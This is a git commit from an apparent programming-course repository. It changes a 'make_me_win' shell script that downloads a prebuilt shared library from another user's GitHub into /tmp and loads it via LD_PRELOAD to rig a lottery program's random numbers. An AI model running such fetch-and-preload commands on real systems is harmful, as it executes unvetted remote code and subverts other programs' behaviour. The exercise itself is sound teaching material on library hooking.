8e8c864125dfc19faa5fe9ce1f9bb07755664ad7
EddV23 <edjevan40@gmail.com>
2023-11-14 05:56:37 +0000

    code injection, runs commands on the same server where the Giga Million program runs, to make you win a Jackpot

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P .. https://github.com/EddV23/alx-low_level_programming/blob/master/0x18-dynamic_libraries/mywin.so
-export LD_PRELOAD="$PWD/../myrand_2.so"
+wget -P /tmp https://github.com/Tolulope05/alx-low_level_programming/raw/master/0x18-dynamic_libraries/nrandom.so
+export LD_PRELOAD=/tmp/nrandom.so
